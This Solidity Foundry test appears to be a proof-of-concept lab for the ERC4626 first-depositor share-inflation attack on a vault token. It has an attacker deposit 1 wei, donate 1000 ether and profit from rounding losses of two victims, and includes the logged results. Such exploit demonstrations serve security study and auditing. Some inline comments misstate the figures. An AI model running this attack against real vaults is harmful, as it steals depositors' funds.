/*
 * By inflating the price per share, first depositor can rip off from victim1 and victiom2 due to 
 * rounding down error introduced by the implementation of ERC4626. 
 * The following log shows the finding: 
 * Logs:
  first depositor balance of TokenB 1
  asset/share:  1
  asset/share:  1000000000000000000001
  victim 1 balance of TokenB 1
  asset/share:  1500000000000000000000
  victim 2 balance of TokenB 1
  asset/share:  1666666666666666666667

 withdrawing....
  first depositor balance of PPswap 2666666666666666666666
  asset/share:  1666666666666666666667

 victim1 balance of PPswap 1666666666666666666667
  asset/share:  1666666666666666666667

 victim2 balance of PPswap 1666666666666666666667
  asset/share:  1
*/



// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {PPSwap} from "../..//src/first-depositor-attack/PPSwap.sol";
import {TokenB} from "../../src/first-depositor-attack/TokenB.sol";
import {TokenBFactory} from "../../src/first-depositor-attack/TokenBFactory.sol";


contract TokenBTest is Test {
    PPSwap ppswap;
    TokenB tokenB;
    TokenBFactory tokenBFactory;
    address deployer = makeAddr("deployer");
    address firstDepositor = makeAddr("firstDepositor");
    address victim1 = makeAddr("victim1");
    address victim2 = makeAddr("victim2");

    function setUp() public {
        ppswap = new PPSwap();
        ppswap.transfer(deployer, 2000 ether);
        ppswap.transfer(firstDepositor, 2000 ether);
        ppswap.transfer(victim1, 2000 ether);
        ppswap.transfer(victim2, 2000 ether);
         
        vm.prank(deployer);
        tokenBFactory = new TokenBFactory();
        tokenB = tokenBFactory.deployTokenB(address(ppswap));
    }

    function testFirstDepositorAttack() public {
        vm.startPrank(firstDepositor);
        ppswap.approve(address(tokenB), 1);
        tokenB.deposit(1, firstDepositor); // amount, receiver
        console2.log("first depositor balance of TokenB", tokenB.balanceOf(firstDepositor));
        console2.log("asset/share: ", tokenB.previewRedeem(1));

        // first depositor donate 1000 ether to inflate price per share
        ppswap.transfer(address(tokenB), 1000 ether);
        console2.log("asset/share: ", tokenB.previewRedeem(1));
        vm.stopPrank();

        // victim 1 deposit
        vm.startPrank(victim1);
        ppswap.approve(address(tokenB), 2000 ether);
        tokenB.deposit(2000 ether, victim1); // amount, receiver
        console2.log("victim 1 balance of TokenB", tokenB.balanceOf(victim1));
        console2.log("asset/share: ", tokenB.previewRedeem(1));
        vm.stopPrank();

         // victim 2 deposit 
        vm.startPrank(victim2);
        ppswap.approve(address(tokenB), 2000 ether);
        tokenB.deposit(2000 ether, victim2); // amount, receiver
        console2.log("victim 2 balance of TokenB", tokenB.balanceOf(victim2));
        console2.log("asset/share: ", tokenB.previewRedeem(1));
        vm.stopPrank();

        console2.log("\n withdrawing....");
        
        // first depositor withdraw 
        vm.startPrank(firstDepositor);
        tokenB.approve(address(tokenB), 1);
        tokenB.redeem(1, firstDepositor, firstDepositor); // amount, receiver, owner
        // he gained 666 ether below
        console2.log("first depositor balance of PPswap", ppswap.balanceOf(firstDepositor));
        console2.log("asset/share: ", tokenB.previewRedeem(1));
        vm.stopPrank();

        // victim1  withdraw 
        vm.startPrank(victim1);
        // tokenB.approve(address(tokenB), 1);
        tokenB.redeem(1, victim1, victim1); // amount, receiver, owner
        // he gained 1250 ether below
        console2.log("\n victim1 balance of PPswap", ppswap.balanceOf(victim1));
        // lost around 333 ether
        console2.log("asset/share: ", tokenB.previewRedeem(1));
        vm.stopPrank();

        // victim2  withdraw 
        vm.startPrank(victim2);
        // tokenB.approve(address(tokenB), 1);
        tokenB.redeem(1, victim2, victim2); // amount, receiver, owner
        // he gained 1250 ether below
        console2.log("\n victim2 balance of PPswap", ppswap.balanceOf(victim2));
        // lost around 333 ether
        console2.log("asset/share: ", tokenB.previewRedeem(1));
        vm.stopPrank();

    }

}
